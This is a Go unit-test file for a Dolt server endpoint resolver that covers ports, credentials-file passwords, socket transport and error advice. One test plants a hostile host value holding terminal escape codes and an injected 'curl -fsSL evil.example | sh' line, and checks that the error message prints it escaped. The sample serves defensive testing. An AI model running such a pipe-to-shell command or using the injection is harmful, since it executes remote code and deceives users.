package doltserver

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/steveyegge/beads/internal/config"
	"github.com/steveyegge/beads/internal/configfile"
)

// endpointTestEnv clears every setting ResolveEndpoint reads, points the
// credentials file at a fresh file holding sections, and returns a workspace.
func endpointTestEnv(t *testing.T, sections map[string]string) string {
	t.Helper()
	for _, name := range []string{
		"BEADS_DOLT_SHARED_SERVER", "BEADS_DOLT_SERVER_MODE", "BEADS_DOLT_SERVER_PORT", "BEADS_DOLT_PORT",
		"BEADS_DOLT_SERVER_HOST", "BEADS_DOLT_PASSWORD", "BEADS_DOLT_AUTO_START", "BEADS_DOLT_SERVER_USER",
		"BEADS_DOLT_SERVER_SOCKET", "BEADS_DOLT_DATA_DIR", "BEADS_DOLT_CREDENTIAL_COMMAND",
	} {
		t.Setenv(name, "")
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	var b strings.Builder
	for section, password := range sections {
		fmt.Fprintf(&b, "[%s]\npassword=%s\n\n", section, password)
	}
	credentials := filepath.Join(home, "credentials")
	if err := os.WriteFile(credentials, []byte(b.String()), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("BEADS_CREDENTIALS_FILE", credentials)
	config.ResetForTesting()
	t.Cleanup(config.ResetForTesting)
	return t.TempDir()
}

func writeEndpointMetadata(t *testing.T, beadsDir string, cfg *configfile.Config) {
	t.Helper()
	if cfg.Backend == "" {
		cfg.Backend = configfile.BackendDolt
	}
	if err := cfg.Save(beadsDir); err != nil {
		t.Fatal(err)
	}
}

// TestResolveEndpointKeysThePasswordToTheDialedPort pins ResolveEndpoint's
// invariant: the port is DialConfig's (the store's rule, the legacy
// BEADS_DOLT_PORT included), and the password is BEADS_DOLT_PASSWORD or the
// credentials-file entry for exactly that [host:port], never the entry for a
// port the legacy variable replaces (a port file's, the shared default
// 3308's) or a stand-in default (3307).
func TestResolveEndpointKeysThePasswordToTheDialedPort(t *testing.T) {
	sections := map[string]string{
		"127.0.0.1:13307": "for-13307",
		"127.0.0.1:13400": "for-13400",
		"127.0.0.1:14444": "for-14444",
		"127.0.0.1:15555": "for-15555",
		"127.0.0.1:3307":  "for-3307",
		"127.0.0.1:3308":  "for-3308",
		"127.0.0.1:0":     "for-0",
		"[::1]:13307":     "for-v6-13307",
	}
	for _, tc := range []struct {
		name         string
		serverPort   string
		legacyPort   string
		envPassword  string
		shared       bool
		portFile     int
		metadataPort int
		host         string
		wantPort     int
		wantSource   PortSource
		wantPassword string
	}{
		{name: "nothing names a port", wantSource: PortSourceUnset},
		{name: "legacy BEADS_DOLT_PORT only", legacyPort: "13307", wantPort: 13307, wantSource: PortSourceEnv, wantPassword: "for-13307"},
		{name: "BEADS_DOLT_SERVER_PORT over legacy", serverPort: "13400", legacyPort: "13307", wantPort: 13400, wantSource: PortSourceEnv, wantPassword: "for-13400"},
		{name: "legacy replaces the port file", legacyPort: "13307", portFile: 14444, wantPort: 13307, wantSource: PortSourceEnv, wantPassword: "for-13307"},
		{name: "port file alone", portFile: 14444, wantPort: 14444, wantSource: PortSourcePortFile, wantPassword: "for-14444"},
		{name: "legacy replaces the shared default", shared: true, legacyPort: "13307", wantPort: 13307, wantSource: PortSourceEnv, wantPassword: "for-13307"},
		{name: "shared default", shared: true, wantPort: DefaultSharedServerPort, wantSource: PortSourceSharedServerDefault, wantPassword: "for-3308"},
		{name: "metadata port over legacy", legacyPort: "13307", metadataPort: 15555, wantPort: 15555, wantSource: PortSourceMetadataJSON, wantPassword: "for-15555"},
		{name: "BEADS_DOLT_PASSWORD wins", legacyPort: "13307", envPassword: "from-env", wantPort: 13307, wantSource: PortSourceEnv, wantPassword: "from-env"},
		{name: "bracketed IPv6 host", host: "[::1]", serverPort: "13307", wantPort: 13307, wantSource: PortSourceEnv, wantPassword: "for-v6-13307"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			beadsDir := endpointTestEnv(t, sections)
			t.Setenv("BEADS_DOLT_SERVER_PORT", tc.serverPort)
			t.Setenv("BEADS_DOLT_PORT", tc.legacyPort)
			t.Setenv("BEADS_DOLT_PASSWORD", tc.envPassword)
			if tc.shared {
				t.Setenv("BEADS_DOLT_SHARED_SERVER", "1")
				t.Setenv("HOME", t.TempDir())
			}
			if tc.portFile > 0 {
				if err := writePortFile(beadsDir, tc.portFile); err != nil {
					t.Fatal(err)
				}
			}
			fileCfg := &configfile.Config{DoltMode: configfile.DoltModeServer, DoltServerPort: tc.metadataPort, DoltServerHost: tc.host}
			writeEndpointMetadata(t, beadsDir, fileCfg)

			ep := ResolveEndpoint(beadsDir, fileCfg)

			dial := DialConfig(beadsDir)
			if ep.Port != dial.Port || ep.PortSource != dial.PortSource {
				t.Errorf("endpoint port %d (%s), DialConfig %d (%s): the endpoint must take the store's port rule", ep.Port, ep.PortSource, dial.Port, dial.PortSource)
			}
			if ep.Port != tc.wantPort || ep.PortSource != tc.wantSource {
				t.Errorf("port = %d (%s), want %d (%s)", ep.Port, ep.PortSource, tc.wantPort, tc.wantSource)
			}
			if ep.Password() != tc.wantPassword {
				t.Errorf("password = %q, want %q, the one for the port the store dials", ep.Password(), tc.wantPassword)
			}
			if ep.Resolved() != (tc.wantPort > 0) {
				t.Errorf("Resolved() = %v with port %d", ep.Resolved(), ep.Port)
			}
		})
	}
}

// TestEndpointReKeysThePasswordWithTheEndpoint pins that a caller that dials
// a host or a port of its own gets the password for that one.
func TestEndpointReKeysThePasswordWithTheEndpoint(t *testing.T) {
	beadsDir := endpointTestEnv(t, map[string]string{
		"127.0.0.1:13307":  "local-13307",
		"127.0.0.1:13500":  "local-13500",
		"db.example:13307": "remote-13307",
		"[::1]:13500":      "v6-13500",
	})
	t.Setenv("BEADS_DOLT_PORT", "13307")
	ep := ResolveEndpoint(beadsDir, nil)
	if ep.Password() != "local-13307" {
		t.Fatalf("precondition: password = %q, want local-13307", ep.Password())
	}
	if got := ep.WithHost("db.example").Password(); got != "remote-13307" {
		t.Errorf("WithHost(db.example).Password = %q, want remote-13307", got)
	}
	if got := ep.AtPort(13500, PortSourceCallerExplicit); got.Password() != "local-13500" || got.Port != 13500 || got.PortSource != PortSourceCallerExplicit {
		t.Errorf("AtPort(13500) = %d (%s) password %q, want 13500 (caller_explicit) local-13500", got.Port, got.PortSource, got.Password())
	}
	if got := ep.WithHost("::1").AtPort(13500, PortSourceCallerExplicit).Password(); got != "v6-13500" {
		t.Errorf("WithHost(::1).AtPort(13500).Password() = %q, want v6-13500", got)
	}
}

// TestEndpointUnresolvedAdvice pins what bd says instead of dialing an
// endpoint with no port: the store's own remedy (UnresolvedPortRemedy), which
// says a bd command starts the server only when one would.
func TestEndpointUnresolvedAdvice(t *testing.T) {
	for _, tc := range []struct {
		name        string
		host        string
		autoStart   string // BEADS_DOLT_AUTO_START
		serverMode  bool   // BEADS_DOLT_SERVER_MODE=1: externally managed
		portFile    bool
		credCmd     string // BEADS_DOLT_CREDENTIAL_COMMAND: a gateway
		socket      string // metadata.json dolt_server_socket
		shared      bool   // BEADS_DOLT_SHARED_SERVER=1
		wantStarts  bool
		want        string
		wantNothing bool
	}{
		{name: "bd's own server, auto-start on", wantStarts: true, want: "Run a bd command that can start one, or start it with:\n  bd dolt start"},
		{name: "bd's own server, auto-start off", autoStart: "0", want: "dolt.auto-start is off, so bd does not start this workspace's Dolt server."},
		{name: "externally managed local server", serverMode: true, want: "This workspace's Dolt server is externally managed, so bd does not start it."},
		{name: "IPv6 loopback", host: "::1", want: "bd does not manage the Dolt server at ::1; pin its port"},
		{name: "remote host", host: "db.example.com", want: "bd does not manage the Dolt server at db.example.com; pin its port"},
		{name: "resolved", portFile: true, wantStarts: true, wantNothing: true},
		// The store turns auto-start off for a gateway (ApplyGatewayCredential)
		// and calls its server externally managed.
		{name: "gateway credential command", credCmd: "printf tok-gw", want: "This workspace's Dolt server is externally managed, so bd does not start it."},
		{name: "gateway, port resolved", credCmd: "printf tok-gw", portFile: true, wantNothing: true},
		// The store never auto-starts in socket mode; a socket is an address.
		{name: "socket only", socket: "/tmp/beads-endpoint-advice.sock", wantNothing: true},
		// Shared-server mode is external to the store's auto-start
		// (ResolveServerMode), and resolves the shared default port.
		{name: "shared server", shared: true, wantNothing: true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			beadsDir := endpointTestEnv(t, nil)
			t.Setenv("BEADS_DOLT_AUTO_START", tc.autoStart)
			if tc.serverMode {
				t.Setenv("BEADS_DOLT_SERVER_MODE", "1")
			}
			if tc.portFile {
				if err := writePortFile(beadsDir, 14444); err != nil {
					t.Fatal(err)
				}
			}
			t.Setenv("BEADS_DOLT_CREDENTIAL_COMMAND", tc.credCmd)
			if tc.shared {
				t.Setenv("BEADS_DOLT_SHARED_SERVER", "1")
			}
			writeEndpointMetadata(t, beadsDir, &configfile.Config{DoltMode: configfile.DoltModeServer, DoltServerHost: tc.host, DoltServerSocket: tc.socket})

			ep := ResolveEndpoint(beadsDir, nil)
			if got := ep.BDStartsServer(); got != tc.wantStarts {
				t.Errorf("BDStartsServer() = %v, want %v", got, tc.wantStarts)
			}
			advice := ep.UnresolvedAdvice()
			if tc.wantNothing {
				if advice != "" {
					t.Errorf("UnresolvedAdvice() = %q for a resolved endpoint", advice)
				}
				return
			}
			if !strings.Contains(advice, tc.want) {
				t.Errorf("UnresolvedAdvice() = %q, want it to contain %q", advice, tc.want)
			}
			// The advice names the test's own port file, whose random temp
			// path can contain any digits: check only what bd wrote.
			bdText := strings.ReplaceAll(strings.ReplaceAll(advice, ep.portFile(), "<port-file>"), beadsDir, "<beads>")
			for _, banned := range []string{":0", "3307"} {
				if strings.Contains(bdText, banned) {
					t.Errorf("UnresolvedAdvice() = %q names %q", advice, banned)
				}
			}
			if !tc.wantStarts && strings.Contains(advice, "bd dolt start") {
				t.Errorf("UnresolvedAdvice() = %q suggests bd dolt start for a server bd does not start", advice)
			}
		})
	}
}

// stubSocketProbe makes the transport probes see only the addresses in live
// ("unix|path" or "tcp|host:port"), and records every probe.
func stubSocketProbe(t *testing.T, live ...string) *[]string {
	t.Helper()
	orig := socketDialProbe
	t.Cleanup(func() { socketDialProbe = orig })
	var probed []string
	socketDialProbe = func(network, addr string, _ time.Duration) error {
		probed = append(probed, network+"|"+addr)
		for _, l := range live {
			if l == network+"|"+addr {
				return nil
			}
		}
		return errors.New("stub: unreachable")
	}
	return &probed
}

// TestEndpointDialDSNIsTheStoresConnection pins Endpoint.DialDSN, the one
// connection every diagnostic dials, to the store's: the transport is the
// store's socket-first / TCP-fallback choice (a socket-only workspace is
// dialable, not refused as having no port), the user is a configured
// credential command's token over the static user (a named user over both),
// the password is the endpoint's, and an endpoint with no address is
// refused rather than dialed at host:0.
func TestEndpointDialDSNIsTheStoresConnection(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the credential commands below are POSIX shell commands")
	}
	const sock = "/tmp/beads-endpoint-test.sock"
	for _, tc := range []struct {
		name       string
		ep         Endpoint
		live       []string
		wantSocket string
		wantUser   string
		wantErr    string
	}{
		{name: "TCP", ep: Endpoint{Host: "127.0.0.1", Port: 13307, User: "beads"}.WithPassword("pw"), wantUser: "beads"},
		{name: "socket only, socket down", ep: Endpoint{Host: "127.0.0.1", Socket: sock, User: "beads"}.WithPassword("pw"), wantSocket: sock, wantUser: "beads"},
		{name: "socket live", ep: Endpoint{Host: "127.0.0.1", Port: 13307, Socket: sock, User: "beads"}.WithPassword("pw"), live: []string{"unix|" + sock}, wantSocket: sock, wantUser: "beads"},
		{name: "socket down, TCP up", ep: Endpoint{Host: "127.0.0.1", Port: 13307, Socket: sock, User: "beads"}.WithPassword("pw"), live: []string{"tcp|127.0.0.1:13307"}, wantUser: "beads"},
		{name: "credential command", ep: Endpoint{Host: "127.0.0.1", Port: 13307, User: "beads", CredentialCommand: "printf tok-dsn"}.WithPassword("pw"), wantUser: "tok-dsn"},
		{name: "named user over the credential command", ep: Endpoint{Host: "127.0.0.1", Port: 13307, CredentialCommand: "exit 3"}.WithPassword("pw").WithUser("named"), wantUser: "named"},
		{name: "failing credential command", ep: Endpoint{Host: "127.0.0.1", Port: 13307, User: "beads", CredentialCommand: "exit 3"}, wantErr: "credential command"},
		{name: "no address", ep: Endpoint{Host: "127.0.0.1", User: "beads"}, wantErr: ErrUnresolvedPort.Error()},
	} {
		t.Run(tc.name, func(t *testing.T) {
			stubSocketProbe(t, tc.live...)
			dsn, err := tc.ep.DialDSN(context.Background(), "db")
			if tc.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
					t.Fatalf("DialDSN error = %v, want one naming %q", err, tc.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("DialDSN: %v", err)
			}
			if dsn.Socket != tc.wantSocket || dsn.User != tc.wantUser || dsn.Password != tc.ep.Password() ||
				dsn.Host != tc.ep.Host || dsn.Port != tc.ep.Port || dsn.Database != "db" {
				t.Errorf("DialDSN = %+v, want socket %q, user %q, password %q at %s:%d on db",
					dsn, tc.wantSocket, tc.wantUser, tc.ep.Password(), tc.ep.Host, tc.ep.Port)
			}
			if tc.ep.CredentialCommand != "" && tc.ep.WithUser("x").CredentialCommand != "" {
				t.Error("WithUser kept the credential command")
			}
			// A caller that builds its own DSN takes the same transport.
			if got := tc.ep.Transport(); got != tc.wantSocket {
				t.Errorf("Transport = %q, want %q, DialDSN's", got, tc.wantSocket)
			}
		})
	}
}

// TestEndpointProbeAndLocationFollowTheTransport: a socket-only endpoint is
// probed on its socket and named by it, never as host:0, and an endpoint with
// no address is not probed at all.
func TestEndpointProbeAndLocationFollowTheTransport(t *testing.T) {
	const sock = "/tmp/beads-endpoint-probe.sock"
	probed := stubSocketProbe(t, "unix|"+sock)
	socketOnly := Endpoint{Host: "127.0.0.1", Socket: sock}
	if !socketOnly.Dialable() || socketOnly.Resolved() {
		t.Fatalf("socket-only endpoint: Dialable %v, Resolved %v; want dialable with no port", socketOnly.Dialable(), socketOnly.Resolved())
	}
	if err := socketOnly.Probe(time.Second); err != nil {
		t.Errorf("Probe of a live socket: %v", err)
	}
	if got := socketOnly.Location(); got != "unix:"+sock {
		t.Errorf("Location = %q, want the socket", got)
	}
	if socketOnly.UnresolvedError() != nil || socketOnly.UnresolvedAdvice() != "" {
		t.Error("a socket-only endpoint was treated as having no address")
	}
	none := Endpoint{Host: "127.0.0.1"}
	before := len(*probed)
	if err := none.Probe(time.Second); !errors.Is(err, ErrUnresolvedPort) {
		t.Errorf("Probe with no address = %v, want ErrUnresolvedPort", err)
	}
	if len(*probed) != before {
		t.Errorf("an endpoint with no address was probed: %v", (*probed)[before:])
	}
	if got := none.Location(); strings.Contains(got, ":0") {
		t.Errorf("Location = %q names port 0", got)
	}
	if got := (Endpoint{Host: "::1", Port: 13307}).Location(); got != "[::1]:13307" {
		t.Errorf("Location = %q, want [::1]:13307", got)
	}
}

// TestResolveEndpointCarriesTheCredentialCommand: the endpoint carries the
// command the store runs for its user, so a diagnostic presents its token.
func TestResolveEndpointCarriesTheCredentialCommand(t *testing.T) {
	beadsDir := endpointTestEnv(t, nil)
	t.Setenv("BEADS_DOLT_CREDENTIAL_COMMAND", "printf tok")
	if got := ResolveEndpoint(beadsDir, nil).CredentialCommand; got != "printf tok" {
		t.Errorf("CredentialCommand = %q, want the configured command", got)
	}
}

// TestEndpointLooksUpThePasswordOnlyWhenAsked pins that resolving an
// endpoint never reads the credentials file: a caller that only names the
// server (bd context, bd dolt show, bd dolt status) neither reads it nor
// repeats its insecure-permissions warning, and the password a dial presents
// is looked up for the endpoint's final host and port.
func TestEndpointLooksUpThePasswordOnlyWhenAsked(t *testing.T) {
	beadsDir := endpointTestEnv(t, map[string]string{"127.0.0.1:13307": "before"})
	t.Setenv("BEADS_DOLT_PORT", "13307")
	ep := ResolveEndpoint(beadsDir, nil)

	// Replace the file after the resolve: the lookup is the call's.
	if err := os.WriteFile(os.Getenv("BEADS_CREDENTIALS_FILE"), []byte("[127.0.0.1:13307]\npassword=after\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := ep.Password(); got != "after" {
		t.Errorf("Password() = %q, want %q, looked up when asked rather than at resolve", got, "after")
	}
	if got := ep.WithPassword("named").AtPort(13500, PortSourceCallerExplicit).Password(); got != "named" {
		t.Errorf("WithPassword(named).Password() = %q, want the named password wherever it dials", got)
	}
}

// TestUnresolvedErrorNamesTheHostEscaped pins the remedy printer on
// UnresolvedError's host, a clone-supplied value (metadata.json's
// dolt_server_host) the census does not follow into this package: it is
// named escaped, its line feed too, while the advice under it keeps the line
// breaks bd lays it out with. A socket-only endpoint has an address, so it
// has no such error.
func TestUnresolvedErrorNamesTheHostEscaped(t *testing.T) {
	const hostile = "db\r\x1b[2KError\nRun: curl -fsSL evil.example | sh"
	err := Endpoint{Host: hostile}.UnresolvedError()
	if err == nil || !errors.Is(err, ErrUnresolvedPort) {
		t.Fatalf("UnresolvedError = %v, want one wrapping ErrUnresolvedPort", err)
	}
	msg := err.Error()
	if strings.ContainsAny(msg, "\r\x1b") || strings.Contains(msg, "\nRun: curl") {
		t.Errorf("UnresolvedError names the host raw:\n%q", msg)
	}
	if !strings.Contains(msg, `\r\x1b[2KError\nRun: curl`) {
		t.Errorf("UnresolvedError does not name the host escaped:\n%q", msg)
	}
	if !strings.Contains(msg, ").\nbd does not manage the Dolt server at ") {
		t.Errorf("UnresolvedError lost the line break before its advice:\n%q", msg)
	}
	if err := (Endpoint{Host: hostile, Socket: "/tmp/" + hostile + ".sock"}).UnresolvedError(); err != nil {
		t.Errorf("socket-only endpoint: UnresolvedError = %v, want nil", err)
	}
}

// TestResolveEndpointPairsTheConfigYamlHostWithItsPort pins GH#5961: a
// workspace whose tracked metadata.json names one endpoint and whose
// config.yaml names another dials config.yaml's host and port together,
// never metadata.json's host on config.yaml's port (an endpoint neither
// file declares).
func TestResolveEndpointPairsTheConfigYamlHostWithItsPort(t *testing.T) {
	beadsDir := endpointTestEnv(t, nil)
	writeEndpointMetadata(t, beadsDir, &configfile.Config{
		DoltMode:       configfile.DoltModeServer,
		DoltServerHost: "127.0.0.1",
		DoltServerPort: 27169,
	})
	yaml := "dolt.mode: server\ndolt.host: 192.0.2.50\ndolt.port: 3307\n"
	if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}

	var ep Endpoint
	if err := config.WithBeadsDir(beadsDir, func() { ep = ResolveEndpoint(beadsDir, nil) }); err != nil {
		t.Fatalf("config.WithBeadsDir: %v", err)
	}
	if ep.Host != "192.0.2.50" || ep.Port != 3307 || ep.PortSource != PortSourceConfigYaml {
		t.Errorf("ResolveEndpoint = %s:%d (%s), want 192.0.2.50:3307 (%s): config.yaml's host must pair with config.yaml's port", ep.Host, ep.Port, ep.PortSource, PortSourceConfigYaml)
	}
}

// TestServerModeFollowsTheConfigYamlHostOverTheMetadataHost pins GH#5961 for
// mode inference: with config.yaml dolt.host outranking metadata.json
// dolt_server_host, the remote config.yaml host the store dials implies
// server mode, and the storage and lifecycle resolvers agree, instead of a
// local metadata host masking it into embedded storage.
func TestServerModeFollowsTheConfigYamlHostOverTheMetadataHost(t *testing.T) {
	beadsDir := endpointTestEnv(t, nil)
	cfg := &configfile.Config{DoltServerHost: "127.0.0.1"}
	writeEndpointMetadata(t, beadsDir, cfg)
	if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte("dolt.host: db.example.com\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var serverMode bool
	var mode ServerMode
	if err := config.WithBeadsDir(beadsDir, func() {
		serverMode = cfg.IsDoltServerMode()
		mode = ResolveServerMode(beadsDir)
	}); err != nil {
		t.Fatalf("config.WithBeadsDir: %v", err)
	}
	if !serverMode {
		t.Error("IsDoltServerMode() = false, want true: config.yaml dolt.host db.example.com outranks the local metadata host")
	}
	if mode != ServerModeExternal {
		t.Errorf("ResolveServerMode() = %v, want %v", mode, ServerModeExternal)
	}
}
